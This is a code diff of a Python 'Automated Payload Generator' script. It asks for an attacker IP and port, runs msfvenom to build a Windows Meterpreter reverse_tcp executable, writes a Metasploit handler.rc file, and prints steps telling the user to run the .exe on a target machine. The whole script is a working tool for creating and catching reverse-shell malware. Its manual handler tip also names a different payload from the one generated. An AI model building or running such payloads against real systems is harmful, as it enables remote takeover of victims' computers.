@@ -1,18 +1,6 @@
-import argparse
 import os
 import subprocess
 import urllib.request
-
-def parse_args():
-    parser = argparse.ArgumentParser(description="6gen66 - Automated Payload Generator")
-    parser.add_argument(
-        "-p",
-        "--payload",
-        type=str,
-        help="Define your payload's name.(e.g explorer)The program will automatically append .exe to your file.",
-    )
-
-    return parser.parse_args()
 
 ascii_art = r"""
   ad8888ba,                                      ad8888ba,   ad8888ba, 
@@ -36,14 +24,12 @@ def detect_ip():
     try:
         with urllib.request.urlopen('https://api.ipify.org', timeout=5) as response:
             return response.read().decode('utf-8').strip()
-
     except Exception:
         return ("N/A")
 
 
 def get_user_ip():
     print(ascii_art)
-    payload = parse_args()
     current_ip = detect_ip()
     print(f"Your public IP is: {current_ip}")
     while True:
@@ -57,8 +43,6 @@ def get_user_ip():
             return user_given_ip
         else:
              print("Please specify only yes or no.")
-
-
 def get_user_target(lhost):
     while True:
         host_port = input("Enter your LPORT: ").strip()
@@ -70,7 +54,6 @@ def get_user_target(lhost):
     print(f"Setting LPORT to {host_port}")
     print(f"Setting payload name to: {payload_name}.exe")
     return host_port , payload_name
-
 def metasploit_handler(lhost,lport):
     print("Creating a handler file for Metasploit...")
     metasploit_content = f"""
@@ -86,10 +69,53 @@ def metasploit_handler(lhost,lport):
     with open("handler.rc","w") as f:
         f.write(metasploit_content)
     print("Successfully created a handler.rc file!")
+def generate_payload(lhost, lport, payload_name):
+    try:
+        print("Generating payload...")
+        cmd = [
+            'msfvenom',
+            '-p', 'windows/meterpreter/reverse_tcp',
+            f'LHOST={lhost}',
+            f'LPORT={lport}',
+            '-f', 'exe',
+            '-o', f'{payload_name}.exe'
+        ]
+        print(f"Executing: {' '.join(cmd)}")
+        result = subprocess.run(cmd, capture_output=True, text=True)
+        if result.returncode == 0:
+            print(f"Your payload, {payload_name}.exe generated successfully.")
+            return True
+        else:
+            print(f"Error generating payload: {result.stderr}")
+            return False
+    except FileNotFoundError:
+        print("msfvenom not found. Please make sure Metasploit Framework is installed and in PATH.")
+        print("You can install it with: sudo apt install metasploit-framework")
+        return False
+    except Exception as e:
+        print(f"Unexpected error during payload generation: {str(e)}")
+        return False
+
+def main():
+    lhost = get_user_ip()
+    lport, payload_name = get_user_target(lhost)
+
+    if generate_payload(lhost, lport, payload_name):
+        metasploit_handler(lhost, lport)
+        print(f"\nYour payload '{payload_name}.exe' is ready.")
+        print("To use with Metasploit:")
+        print("1. Run: msfconsole -r handler.rc")
+        print("2. Then run the generated .exe on target machine")
+        print("\nTip: You can also manually set up the handler in msfconsole:")
+        print(f"   use exploit/multi/handler")
+        print(f"   set PAYLOAD windows/x64/meterpreter_reverse_https")
+        print(f"   set LHOST {lhost}")
+        print(f"   set LPORT {lport}")
+        print("   exploit -j -z")
+    else:
+        print("Failed to generate payload.")
+if __name__ == "__main__":
+    main()
 
 
-
-lhost = get_user_ip()
-lport, payload_name = get_user_target(lhost)
-metasploit_handler(lhost, lport)
 
